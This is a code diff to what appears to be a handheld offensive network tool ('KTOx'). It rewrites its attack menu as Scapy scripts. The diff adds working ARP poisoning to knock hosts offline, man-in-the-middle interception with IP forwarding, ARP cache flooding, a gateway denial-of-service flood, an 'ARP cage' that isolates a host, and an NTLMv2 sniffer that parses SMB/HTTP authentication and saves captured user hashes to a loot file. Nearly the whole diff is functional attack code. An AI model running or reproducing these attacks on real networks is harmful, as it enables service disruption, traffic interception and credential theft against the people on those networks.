@@ -2029,38 +2029,148 @@ def do_network_scan():
     GetMenuString(lines)
 
 
-def do_arp_kick(target_ip):
+# ── ARP helpers ────────────────────────────────────────────────────────────────
+
+def _ask_pps():
+    """LCD menu to pick packets-per-second rate. Returns int or None if cancelled."""
+    options = [" 5 pkt/s", " 10 pkt/s", " 25 pkt/s", " 50 pkt/s", "100 pkt/s"]
+    sel = GetMenuString(options)
+    if sel is None:
+        return None
+    return int(sel.strip().split()[0])
+
+
+def _scapy_resolve(ip, iface):
+    """Return MAC for ip, or empty string on failure (runs synchronously)."""
+    script = (
+        "import sys,logging;"
+        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+        "from scapy.all import srp,Ether,ARP;"
+        f"ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='{ip}'),"
+        f"iface='{iface}',timeout=2,verbose=0,retry=2);"
+        "print(ans[0][1][Ether].src if ans else '')"
+    )
+    try:
+        r = subprocess.run(["python3", "-c", script],
+                           capture_output=True, text=True, timeout=8)
+        return r.stdout.strip()
+    except Exception:
+        return ""
+
+
+def _scapy_restore(target_ip, target_mac, gw_ip, gw_mac, iface, my_mac):
+    """Send 10 correct ARP replies to restore both sides."""
+    script = (
+        "import sys,time,logging;"
+        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+        "from scapy.all import Ether,ARP,sendp;"
+        f"iface='{iface}';"
+        f"t_ip='{target_ip}';t_mac='{target_mac}';"
+        f"g_ip='{gw_ip}';g_mac='{gw_mac}';"
+        "[\n"
+        "  sendp(Ether(src=g_mac,dst=t_mac)/ARP(op=2,hwsrc=g_mac,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface)\n"
+        "  or sendp(Ether(src=t_mac,dst=g_mac)/ARP(op=2,hwsrc=t_mac,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface)\n"
+        "  for _ in range(10)\n"
+        "]"
+    )
+    try:
+        subprocess.run(["python3", "-c", script],
+                       capture_output=True, timeout=10)
+    except Exception:
+        pass
+
+
+def do_arp_kick(target_ip, pps=10):
+    """Bidirectional ARP poison (target + gateway) at configurable PPS."""
     iface = ktox_state["iface"]
     gw    = ktox_state["gateway"]
-    subprocess.run(["pkill", "-9", "arpspoof"],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, gw],
-                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    ktox_state["running"] = "ARP KICK"
-    Dialog_info(f"ARP KICK active\n{target_ip}\nKEY3=stop", wait=True)
-    subprocess.run(["pkill", "-9", "arpspoof"],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    if not gw:
+        Dialog_info("No gateway!\nRun scan first.", wait=True)
+        return
+
+    Dialog_info(f"Resolving MACs…\n{target_ip}", wait=False, timeout=1)
+    target_mac = _scapy_resolve(target_ip, iface)
+    gw_mac     = _scapy_resolve(gw, iface)
+    if not target_mac:
+        Dialog_info(f"MAC resolve\nfailed for\n{target_ip}", wait=True)
+        return
+
+    interval = 1.0 / max(1, pps)
+    script = (
+        "import sys,time,logging,signal;"
+        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+        "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
+        "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
+        f"iface='{iface}';"
+        f"my=get_if_hwaddr(iface);"
+        f"t_ip='{target_ip}';t_mac='{target_mac}';"
+        f"g_ip='{gw}';g_mac='{gw_mac}';"
+        f"iv={interval!r};"
+        "while True:"
+        "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
+        "  g_mac and sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
+        "  time.sleep(iv)"
+    )
+    proc = subprocess.Popen(["python3", "-c", script],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = f"ARP KICK {pps}/s"
+    Dialog_info(f"ARP KICK\n{target_ip}\n{pps} pkt/s bidir\nKEY3=stop", wait=True)
+    proc.terminate()
+    try:
+        proc.wait(timeout=2)
+    except Exception:
+        proc.kill()
     ktox_state["running"] = None
-    Dialog_info("Kick stopped.", wait=False, timeout=1)
+    if target_mac and gw_mac:
+        _scapy_restore(target_ip, target_mac, gw, gw_mac, iface, "")
+    Dialog_info("Kick stopped.\nARP restored.", wait=False, timeout=1)
 
 
 def do_mitm(target_ip):
+    """Bidirectional ARP MITM using Scapy. Enables IP forwarding."""
     iface = ktox_state["iface"]
     gw    = ktox_state["gateway"]
-    subprocess.run(["pkill", "-9", "arpspoof"],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    if not gw:
+        Dialog_info("No gateway!\nRun scan first.", wait=True)
+        return
+
+    Dialog_info(f"Resolving MACs…\n{target_ip}", wait=False, timeout=1)
+    target_mac = _scapy_resolve(target_ip, iface)
+    gw_mac     = _scapy_resolve(gw, iface)
+    if not target_mac or not gw_mac:
+        Dialog_info("MAC resolve\nfailed.", wait=True)
+        return
+
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, gw],
-                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, target_ip],
-                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    script = (
+        "import sys,time,logging,signal;"
+        "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+        "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
+        "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
+        f"iface='{iface}';"
+        f"my=get_if_hwaddr(iface);"
+        f"t_ip='{target_ip}';t_mac='{target_mac}';"
+        f"g_ip='{gw}';g_mac='{gw_mac}';"
+        "while True:"
+        "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
+        "  sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
+        "  time.sleep(0.5)"
+    )
+    proc = subprocess.Popen(["python3", "-c", script],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     ktox_state["running"] = "MITM"
-    Dialog_info(f"MITM active\n{target_ip}\nFwd ON\nKEY3=stop", wait=True)
-    subprocess.run(["pkill", "-9", "arpspoof"],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    Dialog_info(f"MITM ACTIVE\n{target_ip}\nFwd ON\nKEY3=stop", wait=True)
+    proc.terminate()
+    try:
+        proc.wait(timeout=2)
+    except Exception:
+        proc.kill()
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     ktox_state["running"] = None
-    Dialog_info("MITM stopped.\nFwd OFF.", wait=False, timeout=1)
+    _scapy_restore(target_ip, target_mac, gw, gw_mac, iface, "")
+    Dialog_info("MITM stopped.\nFwd OFF.\nARP restored.", wait=False, timeout=2)
+
+
 
 
 def do_wifi_monitor_on():
@@ -2899,12 +3009,71 @@ class KTOxMenu:
 
     def _kick_one(self):
         tgt = _pick_host()
-        if tgt and YNDialog("KICK", y="Yes", n="No", b=f"Kick {tgt}?"):
-            do_arp_kick(tgt)
+        if not tgt:
+            return
+        pps = _ask_pps()
+        if pps is None:
+            return
+        if YNDialog("KICK ONE", y="Yes", n="No", b=f"Kick {tgt}\n@ {pps} pkt/s?"):
+            do_arp_kick(tgt, pps)
 
     def _kick_all(self):
-        if YNDialog("KICK ALL", y="Yes", n="No", b="Boot everyone?"):
-            do_arp_kick(ktox_state["gateway"])
+        """Kick every non-gateway host discovered in the last scan."""
+        gw     = ktox_state["gateway"]
+        iface  = ktox_state["iface"]
+        hosts  = [h["ip"] for h in ktox_state.get("hosts", [])
+                  if h["ip"] != gw]
+        if not hosts:
+            Dialog_info("No hosts found.\nRun scan first.", wait=True)
+            return
+        pps = _ask_pps()
+        if pps is None:
+            return
+        if not YNDialog("KICK ALL", y="Yes", n="No",
+                        b=f"Kick {len(hosts)} hosts\n@ {pps} pkt/s?"):
+            return
+
+        Dialog_info("Resolving MACs…", wait=False, timeout=1)
+        targets = [(ip, _scapy_resolve(ip, iface)) for ip in hosts]
+        targets = [(ip, mac) for ip, mac in targets if mac]
+        if not targets:
+            Dialog_info("No MACs resolved.\nHosts offline?", wait=True)
+            return
+
+        gw_mac   = _scapy_resolve(gw, iface)
+        interval = 1.0 / max(1, pps)
+        t_list   = ";".join(f"('{ip}','{mac}')" for ip, mac in targets)
+
+        script = (
+            "import sys,time,logging,signal;"
+            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
+            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
+            f"iface='{iface}';"
+            f"my=get_if_hwaddr(iface);"
+            f"g_ip='{gw}';g_mac='{gw_mac}';"
+            f"iv={interval!r};"
+            f"targets=[{t_list}];"
+            "while True:"
+            "  for t_ip,t_mac in targets:"
+            "    sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
+            "    g_mac and sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
+            "    time.sleep(iv)"
+        )
+        proc = subprocess.Popen(["python3", "-c", script],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ktox_state["running"] = f"KICK ALL {pps}/s"
+        Dialog_info(f"KICK ALL\n{len(targets)} hosts\n{pps} pkt/s\nKEY3=stop", wait=True)
+        proc.terminate()
+        try:
+            proc.wait(timeout=2)
+        except Exception:
+            proc.kill()
+        ktox_state["running"] = None
+        if gw_mac:
+            for t_ip, t_mac in targets:
+                _scapy_restore(t_ip, t_mac, gw, gw_mac, iface, "")
+        Dialog_info("Kick ALL stopped.\nARP restored.", wait=False, timeout=1)
 
     def _do_mitm(self):
         tgt = _pick_host()
@@ -2912,59 +3081,234 @@ class KTOxMenu:
             do_mitm(tgt)
 
     def _arp_flood(self):
+        """Real ARP cache flood: sends randomised ARP replies at high rate."""
         tgt   = _pick_host()
         iface = ktox_state["iface"]
-        if tgt and YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}?"):
-            subprocess.run(["pkill", "-9", "arpspoof"],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            for fake in [f"10.0.0.{i}" for i in range(1, 20)]:
-                subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, fake],
-                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            ktox_state["running"] = "ARP FLOOD"
-            Dialog_info(f"ARP FLOOD\n{tgt}\n20 sources\nKEY3=stop", wait=True)
-            subprocess.run(["pkill", "-9", "arpspoof"],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            ktox_state["running"] = None
-            Dialog_info("Flood stopped.", wait=False, timeout=1)
+        if not tgt:
+            return
+        pps = _ask_pps()
+        if pps is None:
+            return
+        if not YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}\n@ {pps} pkt/s?"):
+            return
+
+        Dialog_info(f"Resolving MAC…\n{tgt}", wait=False, timeout=1)
+        t_mac = _scapy_resolve(tgt, iface)
+        if not t_mac:
+            Dialog_info(f"MAC resolve\nfailed for\n{tgt}", wait=True)
+            return
+
+        interval = 1.0 / max(1, pps)
+        script = (
+            "import sys,time,random,logging,signal;"
+            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+            "from scapy.all import Ether,ARP,sendp;"
+            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
+            f"iface='{iface}';t_ip='{tgt}';t_mac='{t_mac}';iv={interval!r};"
+            "while True:"
+            "  fip='.'.join(str(random.randint(1,254)) for _ in range(4));"
+            "  fmac=':'.join(f'{random.randint(0,255):02x}' for _ in range(6));"
+            "  sendp(Ether(src=fmac,dst=t_mac)/ARP(op=2,hwsrc=fmac,psrc=fip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
+            "  time.sleep(iv)"
+        )
+        proc = subprocess.Popen(["python3", "-c", script],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ktox_state["running"] = f"ARP FLOOD {pps}/s"
+        Dialog_info(f"ARP FLOOD\n{tgt}\n{pps} pkt/s\nrandom src\nKEY3=stop", wait=True)
+        proc.terminate()
+        try:
+            proc.wait(timeout=2)
+        except Exception:
+            proc.kill()
+        ktox_state["running"] = None
+        Dialog_info("Flood stopped.", wait=False, timeout=1)
+
     def _gw_dos(self):
+        """Flood gateway ARP table with random fake entries at configurable PPS."""
         gw    = ktox_state["gateway"]
         iface = ktox_state["iface"]
         if not gw:
             Dialog_info("No gateway!", wait=True)
             return
-        if YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}?"):
-            subprocess.run(["pkill", "-9", "arpspoof"],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            for fake in [f"10.33.0.{i}" for i in range(1, 20)]:
-                subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, fake],
-                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            ktox_state["running"] = "GW DoS"
-            Dialog_info(f"GW DoS active\n{gw}\nKEY3=stop", wait=True)
-            subprocess.run(["pkill", "-9", "arpspoof"],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            ktox_state["running"] = None
-            Dialog_info("DoS stopped.", wait=False, timeout=1)
+        pps = _ask_pps()
+        if pps is None:
+            return
+        if not YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}\n@ {pps} pkt/s?"):
+            return
+
+        Dialog_info(f"Resolving GW MAC…\n{gw}", wait=False, timeout=1)
+        gw_mac = _scapy_resolve(gw, iface)
+        if not gw_mac:
+            Dialog_info("GW MAC resolve\nfailed.", wait=True)
+            return
+
+        interval = 1.0 / max(1, pps)
+        script = (
+            "import sys,time,random,logging,signal;"
+            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+            "from scapy.all import Ether,ARP,sendp;"
+            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
+            f"iface='{iface}';g_ip='{gw}';g_mac='{gw_mac}';iv={interval!r};"
+            "while True:"
+            "  fip='.'.join(str(random.randint(1,254)) for _ in range(4));"
+            "  fmac=':'.join(f'{random.randint(0,255):02x}' for _ in range(6));"
+            "  sendp(Ether(src=fmac,dst=g_mac)/ARP(op=2,hwsrc=fmac,psrc=fip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
+            "  time.sleep(iv)"
+        )
+        proc = subprocess.Popen(["python3", "-c", script],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ktox_state["running"] = f"GW DoS {pps}/s"
+        Dialog_info(f"GW DoS\n{gw}\n{pps} pkt/s\nKEY3=stop", wait=True)
+        proc.terminate()
+        try:
+            proc.wait(timeout=2)
+        except Exception:
+            proc.kill()
+        ktox_state["running"] = None
+        Dialog_info("DoS stopped.", wait=False, timeout=1)
+
     def _arp_cage(self):
+        """Isolate target from ALL peers: poisons target's view of every host."""
         tgt   = _pick_host()
         gw    = ktox_state["gateway"]
         iface = ktox_state["iface"]
         if not tgt or not gw:
             return
-        if YNDialog("ARP CAGE", y="Yes", n="No", b=f"Cage {tgt}?"):
-            subprocess.run(["pkill", "-9", "arpspoof"],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, gw],
-                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, tgt],
-                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            ktox_state["running"] = "ARP CAGE"
-            Dialog_info(f"Cage ACTIVE\n{tgt}\nisolated\nKEY3=release", wait=True)
-            subprocess.run(["pkill", "-9", "arpspoof"],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            ktox_state["running"] = None
-            Dialog_info("Cage released.", wait=False, timeout=1)
+        peers = [h["ip"] for h in ktox_state.get("hosts", []) if h["ip"] != tgt]
+        if not YNDialog("ARP CAGE", y="Yes", n="No",
+                        b=f"Cage {tgt}\nfrom {len(peers)} peers?"):
+            return
+
+        Dialog_info(f"Resolving MACs…\n{tgt}", wait=False, timeout=1)
+        t_mac    = _scapy_resolve(tgt, iface)
+        gw_mac   = _scapy_resolve(gw, iface)
+        if not t_mac:
+            Dialog_info("Target MAC\nresolve failed.", wait=True)
+            return
+
+        # Resolve peer MACs (best effort)
+        peer_macs = [(ip, _scapy_resolve(ip, iface)) for ip in peers]
+        peer_macs = [(ip, mac) for ip, mac in peer_macs if mac]
+
+        p_list = ";".join(f"('{ip}','{mac}')" for ip, mac in peer_macs)
+        script = (
+            "import sys,time,logging,signal;"
+            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
+            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
+            f"iface='{iface}';"
+            f"my=get_if_hwaddr(iface);"
+            f"t_ip='{tgt}';t_mac='{t_mac}';"
+            f"peers=[{p_list}];"
+            "while True:"
+            "  for p_ip,p_mac in peers:"
+            "    sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=p_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
+            "    time.sleep(0.05)"
+        )
+        proc = subprocess.Popen(["python3", "-c", script],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ktox_state["running"] = "ARP CAGE"
+        Dialog_info(
+            f"Cage ACTIVE\n{tgt}\n{len(peer_macs)} peers faked\nKEY3=release",
+            wait=True
+        )
+        proc.terminate()
+        try:
+            proc.wait(timeout=2)
+        except Exception:
+            proc.kill()
+        ktox_state["running"] = None
+        # Restore target's view of all peers
+        if t_mac:
+            for p_ip, p_mac in peer_macs:
+                _scapy_restore(tgt, t_mac, p_ip, p_mac, iface, "")
+        Dialog_info("Cage released.\nARP restored.", wait=False, timeout=1)
+
     def _ntlm(self):
-        self.navigate("resp")
+        """MITM + NTLMv2 sniffer: poison target then capture auth hashes."""
+        tgt   = _pick_host()
+        iface = ktox_state["iface"]
+        gw    = ktox_state["gateway"]
+        if not tgt or not gw:
+            return
+        if not YNDialog("NTLMv2", y="Yes", n="No",
+                        b=f"MITM+capture\n{tgt}?"):
+            return
+
+        Dialog_info(f"Resolving MACs…\n{tgt}", wait=False, timeout=1)
+        t_mac  = _scapy_resolve(tgt, iface)
+        gw_mac = _scapy_resolve(gw, iface)
+        if not t_mac or not gw_mac:
+            Dialog_info("MAC resolve\nfailed.", wait=True)
+            return
+
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        loot_path = f"{LOOT_DIR}/ntlm_hashes.txt"
+
+        # MITM subprocess
+        mitm_script = (
+            "import sys,time,logging,signal;"
+            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
+            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
+            f"iface='{iface}';"
+            f"my=get_if_hwaddr(iface);"
+            f"t_ip='{tgt}';t_mac='{t_mac}';"
+            f"g_ip='{gw}';g_mac='{gw_mac}';"
+            "while True:"
+            "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
+            "  sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
+            "  time.sleep(0.5)"
+        )
+        # NTLMv2 sniffer subprocess
+        sniff_script = (
+            "import sys,re,struct,logging,os;"
+            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
+            "from scapy.all import sniff,TCP,Raw,Ether,IP;"
+            f"loot='{loot_path}';"
+            "os.makedirs(os.path.dirname(loot),exist_ok=True);"
+            "SIG=b'NTLMSSP\\x00';"
+            "def handle(pkt):\n"
+            "  if not pkt.haslayer(TCP) or not pkt.haslayer(Raw): return\n"
+            "  raw=pkt[Raw].load\n"
+            "  idx=raw.find(SIG)\n"
+            "  if idx<0: return\n"
+            "  blob=raw[idx:]\n"
+            "  try:\n"
+            "    mtype=struct.unpack_from('<I',blob,8)[0]\n"
+            "    if mtype!=3: return\n"
+            "    def f(blob,off): l,_,o=struct.unpack_from('<HHI',blob,off); return blob[o:o+l]\n"
+            "    nt=f(blob,20); dom=f(blob,28); usr=f(blob,36)\n"
+            "    h=f'{usr.decode(\"utf-16-le\",errors=\"replace\")}::{dom.decode(\"utf-16-le\",errors=\"replace\")}::'\\\n"
+            "      +nt.hex()\n"
+            "    print(f'NTLM HASH: {h}',flush=True)\n"
+            "    open(loot,'a').write(h+'\\n')\n"
+            "  except: pass\n"
+            f"sniff(iface='{iface}',filter='tcp and (port 445 or port 80 or port 8080)',prn=handle,store=False)"
+        )
+        p_mitm  = subprocess.Popen(["python3", "-c", mitm_script],
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        p_sniff = subprocess.Popen(["python3", "-c", sniff_script],
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ktox_state["running"] = "NTLMv2"
+        Dialog_info(
+            f"NTLMv2 CAPTURE\n{tgt}\nSMB+HTTP sniff\nKEY3=stop",
+            wait=True
+        )
+        for p in (p_mitm, p_sniff):
+            p.terminate()
+            try: p.wait(timeout=2)
+            except Exception: p.kill()
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        ktox_state["running"] = None
+        _scapy_restore(tgt, t_mac, gw, gw_mac, iface, "")
+        # Count captured hashes
+        try:
+            n = len(open(loot_path).readlines()) if os.path.exists(loot_path) else 0
+        except Exception:
+            n = 0
+        Dialog_info(f"Capture stopped.\n{n} hash(es).\nLoot: ntlm_hashes.txt",
+                    wait=False, timeout=2)
 
     # ── WiFi actions ──────────────────────────────────────────────────────────
 
